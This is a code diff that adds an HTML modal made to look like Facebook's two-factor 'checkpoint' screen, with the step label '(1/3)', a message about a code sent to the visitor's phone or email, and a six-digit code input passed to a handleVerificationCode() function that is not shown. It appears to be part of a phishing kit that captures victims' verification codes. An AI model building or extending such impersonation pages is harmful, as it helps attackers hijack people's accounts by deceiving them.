@@ -1,0 +1,45 @@
+<div class="two-factor-auth" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.2); display: flex; align-items: center; justify-content: center; z-index: 10000">
+  <div style="background: #fff; border-radius: 12px; width: 400px; max-width: 95vw; padding: 24px; text-align: center; position: relative">
+    <!-- Close button -->
+    <button style="position: absolute; right: 16px; top: 16px; background: none; border: none; font-size: 20px; cursor: pointer; color: #65676b" onclick="hideVerificationDialog()">X</button>
+
+    <h2 style="font-size: 20px; margin: 0 0 8px 0; color: #1c2b33;">Two-factor authentication required (1/3)</h2>
+
+    <p style="color: #65676b; font-size: 15px; margin-bottom: 20px; line-height: 1.4;">
+      The verification code has been sent to your phone number or E-mail, please check your inbox and enter the code below to complete. In case you do not receive the code, please check the Facebook notification on your device and confirm it is you to complete the verification process.
+    </p>
+
+    <div style="text-align: center; margin: 20px 0;">
+      <img src="/assets/img/checkpoint.png" alt="2FA Illustration" style="width: 200px; height: auto;">
+    </div>
+
+    <div class="code-error" style="color: #c00; margin-bottom: 16px; display: none;"></div>
+
+    <input type="text"
+           id="verificationCode"
+           placeholder="Code"
+           style="width: 100%;
+                  padding: 12px;
+                  border: 1px solid #ddd;
+                  border-radius: 6px;
+                  margin-bottom: 16px;
+                  box-sizing: border-box;
+                  font-size: 15px;"
+           maxlength="6">
+
+    <button onclick="handleVerificationCode()"
+            style="width: 100%;
+                   background: #E4E6EB;
+                   color: #BCC0C4;
+                   border: none;
+                   border-radius: 6px;
+                   padding: 12px 0;
+                   font-size: 15px;
+                   font-weight: 600;
+                   cursor: pointer;
+                   transition: all 0.3s ease;"
+            id="continueButton">
+      Continue
+    </button>
+  </div>
+</div>
